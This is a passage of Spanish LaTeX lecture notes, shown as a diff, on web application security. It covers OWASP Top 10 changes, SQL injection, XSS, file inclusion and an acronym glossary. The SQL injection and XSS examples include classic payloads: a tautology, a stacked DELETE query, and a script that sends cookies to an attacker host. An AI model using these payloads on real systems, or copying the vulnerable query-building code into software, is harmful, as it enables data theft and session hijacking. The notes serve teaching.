+A4 -- Insecure Direct Object References \textcolor{green!50!black}{[unida con A7]} & $\cup$ & A4 -- XML External Entities (XXE) \textcolor{red!60!black}{[nueva]} \\
+A5 -- Security Misconfiguration & $\searrow$ & A5 -- Broken Access Control \textcolor{red!60!black}{[A4 + A7 de 2013]} \\
+A6 -- Sensitive Data Exposure & $\nearrow$ & A6 -- Security Misconfiguration \\
+A7 -- Missing Function Level Access Control \textcolor{green!50!black}{[unida con A4]} & $\cup$ & A7 -- Cross-Site Scripting (XSS) \\
+A8 -- Cross-Site Request Forgery (CSRF) & $\times$ & A8 -- Insecure Deserialization \textcolor{red!60!black}{[nueva, comunidad]} \\
+A9 -- Using Components with Known Vulnerabilities & $\to$ & A9 -- Using Components with Known Vulnerabilities \\
+A10 -- Unvalidated Redirects and Forwards & $\times$ & A10 -- Insufficient Logging \& Monitoring \textcolor{red!60!black}{[nueva, comunidad]} \\
+\bottomrule
+\end{tabularx}}
+\end{center}
+{\small $\to$ se mantiene; $\searrow$/$\nearrow$ baja/sube; $\cup$ se fusiona; $\times$ sale de la lista. Existen ediciones posteriores del Top 10 (2021 y siguientes).}
+ 
+\section{Ataques de inyección}
+ 
+\begin{itemize}
+  \item Los fallos de inyección ocurren cuando un atacante puede enviar \textbf{datos hostiles a un intérprete}.
+  \item Esos datos pueden engañar al intérprete para que \textbf{ejecute órdenes no previstas} o \textbf{acceda a datos sin la autorización adecuada}.
+  \item Se encuentran a menudo en SQL, órdenes del SO, XPath, analizadores XML, cabeceras SMTP, argumentos de programas, etc.
+\end{itemize}
+ 
+\begin{importante}
+La causa raíz es la \textbf{falta de validación / saneamiento de las entradas}.
+\end{importante}
+ 
+\subsection{Inyección SQL}
+ 
+La transparencia abre con la viñeta 327 de xkcd (\url{https://xkcd.com/327/}), la de ``Little Bobby Tables'': un colegio pierde la tabla de alumnos porque un niño se llama, literalmente, como una orden SQL que borra la tabla. La moraleja es sanear las entradas de la base de datos.
+ 
+\begin{itemize}
+  \item Surge por \textbf{no codificar ni escapar la entrada controlada por el usuario} cuando se incluye en consultas SQL.
+\end{itemize}
+ 
+\begin{ejemplo}{Ejemplo 1: devolver todos los registros}
+La aplicación construye la consulta con datos no fiables:
+\begin{verbatim}
+String query = "SELECT * FROM accounts WHERE custID='"
+             + request.getParameter("id") + "'";
+\end{verbatim}
+El atacante cambia el parámetro \texttt{id} en el navegador a \verb|' or '1'='1|. La consulta queda:
+\begin{verbatim}
+SELECT * FROM accounts WHERE custID='' or '1'='1'
+\end{verbatim}
+Como \verb|'1'='1'| siempre es cierto, el servidor devuelve \textbf{todos los registros} de la tabla \texttt{accounts}.
+\end{ejemplo}
+ 
+\begin{ejemplo}{Ejemplo 2: más peligroso}
+\begin{verbatim}
+String query = "SELECT * FROM items WHERE owner = '" + userName
+             + "' AND itemname = '" + ItemName.Text + "'";
+\end{verbatim}
+El atacante envía como \texttt{userName}: \verb|name'; DELETE FROM items; --|
+\begin{itemize}
+  \item La consulta se convierte en \textbf{dos consultas}, y la segunda \textbf{borra todos los elementos} de la tabla.
+  \item El \verb|--| final convierte en comentario el resto de la consulta original.
+  \item No funciona en todos los SGBD (sistemas gestores de bases de datos), porque no todos admiten varias consultas seguidas.
+\end{itemize}
+\end{ejemplo}
+ 
+\subsection{\emph{Cross-site scripting} (XSS)}
+ 
+\begin{itemize}
+  \item Ocurre cuando un atacante \textbf{inyecta un script de navegador} en una aplicación web.
+    \begin{itemize}
+      \item El script no se ejecuta en el servidor, sino en el \textbf{navegador de la víctima}.
+      \item El servidor web simplemente le entrega el script a la víctima.
+    \end{itemize}
+  \item La víctima normalmente tiene que hacer clic en un enlace malicioso que le llega por \emph{phishing}, por webs maliciosas de tipo \emph{watering hole} (``abrevadero'': webs legítimas que frecuenta la víctima y que el atacante compromete), por publicidad, etc.
+  \item Suele ser JavaScript, pero puede ser cualquier otro contenido que el navegador pueda ejecutar.
+  \item Tipos básicos:
+    \begin{itemize}
+      \item \textbf{XSS reflejado} (\emph{reflected}): el servidor incluye la entrada del usuario sin sanear en el HTML de salida. Un ataque con éxito permite ejecutar HTML y JavaScript arbitrarios en el navegador de la víctima.
+      \item \textbf{XSS almacenado} (\emph{stored}): el servidor guarda la entrada del usuario sin sanear, y otro usuario o un administrador la ve más tarde. Es un riesgo \textbf{alto o crítico}.
+    \end{itemize}
+\end{itemize}
+ 
+\begin{ejemplo}{Ejemplo de XSS}
+El servidor construye la página HTML de salida con una entrada sin validar:
+\begin{verbatim}
+(String) page += "<input name='creditcard' type='TEXT' value='"
+               + request.getParameter("CC") + "'>";
+\end{verbatim}
+El atacante cambia el parámetro \texttt{CC} en el navegador a:
+\begin{verbatim}
+'><script>document.location=
+'http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>
+\end{verbatim}
+El \verb|'>| cierra el atributo y la etiqueta \texttt{input}, y lo que sigue se interpreta como un script. Así, el ID de sesión de la víctima se envía a la web del atacante, que puede \textbf{secuestrar su sesión} actual. (Contra esto protege el \emph{flag} \texttt{httpOnly} de las \emph{cookies}.)
+\end{ejemplo}
+ 
+\subsection{Inclusión de ficheros (\emph{file inclusions})}
+ 
+\begin{itemize}
+  \item Ocurren cuando un atacante consigue \textbf{incluir un fichero} en el servidor web, a menudo a través de un script.
+  \item De nuevo, es una vulnerabilidad causada por \textbf{entrada del usuario sin la validación adecuada}.
+  \item Tipos básicos:
+    \begin{itemize}
+      \item \textbf{LFI} (\emph{Local File Inclusion}): incluye un fichero que ya está en el servidor.
+      \item \textbf{RFI} (\emph{Remote File Inclusion}): incluye un fichero alojado en otra máquina, normalmente controlada por el atacante.
+    \end{itemize}
+\end{itemize}
+ 
+%=====================================================================
+\chapter*{Glosario de siglas del tema}
+\addcontentsline{toc}{chapter}{Glosario de siglas del tema}
+%=====================================================================
+ 
+\begin{multicols}{2}
+\small
+\begin{description}[font=\normalfont\bfseries, itemsep=1pt, leftmargin=0pt]
+  \item[ACK] \emph{Acknowledgement}, acuse de recibo.
+  \item[AP] \emph{Access Point}, punto de acceso.
+  \item[ARP] \emph{Address Resolution Protocol}.
+  \item[ASP] \emph{Active Server Pages}.
+  \item[AXFR] \emph{Authoritative Zone Transfer}.
+  \item[BAF] \emph{Bandwidth Amplification Factor}.
+  \item[BD / SGBD] Base de datos / sistema gestor de bases de datos (DBMS en inglés).
+  \item[base64] Codificación que usa 64 caracteres imprimibles.
+  \item[CC BY] \emph{Creative Commons Attribution}.
+  \item[CGI] \emph{Common Gateway Interface}.
+  \item[CharGEN] \emph{Character Generator Protocol}.
+  \item[CLDAP] \emph{Connectionless LDAP}.
+  \item[CNAME] \emph{Canonical Name}.
+  \item[CSRF] \emph{Cross-Site Request Forgery}.
+  \item[DNS] \emph{Domain Name System}.
+  \item[DNSSEC] \emph{DNS Security Extensions}.
+  \item[DoS / DDoS] \emph{(Distributed) Denial of Service}.
+  \item[DRDoS] \emph{Distributed Reflective Denial of Service}.
+  \item[E2E] \emph{End-to-End}.
+  \item[ETag] \emph{Entity Tag}: identificador de versión de un recurso.
+  \item[FIN] \emph{Finish}.
+  \item[HTML] \emph{HyperText Markup Language}.
+  \item[HTTP(S)] \emph{HyperText Transfer Protocol (Secure)}.
+  \item[IANA] \emph{Internet Assigned Numbers Authority}.
+  \item[ICMP] \emph{Internet Control Message Protocol}.
+  \item[IDS / IPS] \emph{Intrusion Detection / Prevention System}.
+  \item[IGMP] \emph{Internet Group Management Protocol}.
+  \item[IHL] \emph{Internet Header Length}.
+  \item[IIS] \emph{Internet Information Services}.
+  \item[IoT] \emph{Internet of Things}.
+  \item[IP] \emph{Internet Protocol}.
+  \item[LAN] \emph{Local Area Network}.
+  \item[LDAP] \emph{Lightweight Directory Access Protocol}.
+  \item[LFI / RFI] \emph{Local / Remote File Inclusion}.
+  \item[MAC] \emph{Media Access Control} (dirección física).
+  \item[mDNS] \emph{Multicast DNS}.
+  \item[MSL] \emph{Maximum Segment Lifetime}.
+  \item[NIC] \emph{Network Information Center}.
+  \item[NS] \emph{Name Server}.
+  \item[NTP] \emph{Network Time Protocol}.
+  \item[OS / SO] \emph{Operating System}, sistema operativo.
+  \item[OTT] \emph{Over-The-Top}.
+  \item[OWASP] \emph{Open Web Application Security Project}.
+  \item[PHP] \emph{PHP: Hypertext Preprocessor} (acrónimo recursivo; antes, \emph{Personal Home Page}).
+  \item[PSH] \emph{Push}.
+  \item[QOTD] \emph{Quote of the Day}.
+  \item[QUIC] Nombre propio; al principio se leía como \emph{Quick UDP Internet Connections}.
+  \item[RFC] \emph{Request for Comments}.
+  \item[RIP] \emph{Routing Information Protocol}.
+  \item[RPC] \emph{Remote Procedure Call}.
+  \item[RST] \emph{Reset}.
+  \item[SMTP] \emph{Simple Mail Transfer Protocol}.
+  \item[SNMP] \emph{Simple Network Management Protocol}.
+  \item[SOA] \emph{Start of Authority}.
+  \item[SQL] \emph{Structured Query Language}.
+  \item[SSDP] \emph{Simple Service Discovery Protocol}.
+  \item[SYN] \emph{Synchronize}.
+  \item[TA] \emph{Technical Alert} (del US-CERT, \emph{United States Computer Emergency Readiness Team}).
+  \item[TCP] \emph{Transmission Control Protocol}.
+  \item[Telnet] \emph{Teletype Network}.
+  \item[TFTP] \emph{Trivial File Transfer Protocol}.
+  \item[TLS] \emph{Transport Layer Security}.
+  \item[TTL] \emph{Time To Live}.
+  \item[TXT] Registro de texto.
+  \item[UDP] \emph{User Datagram Protocol}.
+  \item[URG] \emph{Urgent}.
+  \item[URI / URL] \emph{Uniform Resource Identifier / Locator}.
+  \item[VoIP] \emph{Voice over IP}.
+  \item[VPN] \emph{Virtual Private Network}.
+  \item[WS-Discovery] \emph{Web Services Dynamic Discovery}.
+  \item[XML] \emph{eXtensible Markup Language}.
+  \item[XPath] \emph{XML Path Language}.
+  \item[XSS] \emph{Cross-Site Scripting} (X para no confundirlo con CSS, las hojas de estilo).
+  \item[XXE] \emph{XML External Entities}.
+\end{description}
+\end{multicols}
 
 \end{document}
